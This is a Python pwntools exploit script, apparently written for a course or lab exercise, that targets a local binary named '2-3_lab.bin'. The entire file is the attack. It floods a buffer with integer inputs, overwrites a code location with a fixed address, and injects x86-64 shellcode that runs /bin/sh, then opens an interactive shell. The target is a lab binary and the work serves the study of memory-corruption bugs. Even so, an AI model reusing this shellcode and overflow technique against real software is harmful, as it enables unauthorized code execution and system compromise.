from pwn import *

context.arch="x86_64"

""" CONSTANTS """
# Set opcode location
OP_LOC = 4199382  # Location as a decimal 0x4013d6 = 4199382
BUFFER_SIZE = 8 # Set buffer size
BLANK = b"0"  # Convert to bytes
EXIT = b"-1 "  # Convert to bytes


""" EXPLOIT DESTINATION """
#p = process("./2-3_lab.bin")  # Uncomment to Test Script Locally
p = gdb.debug("./2-3_lab.bin")


""" DEFINE VARIABLES """
# Define input values
buff_filler = [2863311530, 3149642683]
#Define shellcode
shellcode = b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'

"""CONVERT """
# Convert shellcode to an array of integers
shell_int_array = [int(byte) for byte in shellcode]

"""SEND EXPLOIT """
# format : (<buffer fill>*136 + <opcode> + <shellcode> + b"\n")

# send buffer fill
for x in range(BUFFER_SIZE - 1):
    for each in buff_filler:
        p.sendline(str(each).encode())  # Send the input value twice

# send opcode
p.sendline(str(OP_LOC).encode())  # Send the opcode location as bytes
p.sendline(BLANK)  

# send shellcode
for value in shell_int_array:
        p.sendline(str(value).encode())
   
p.sendline(EXIT)  # Send exit code

p.interactive()
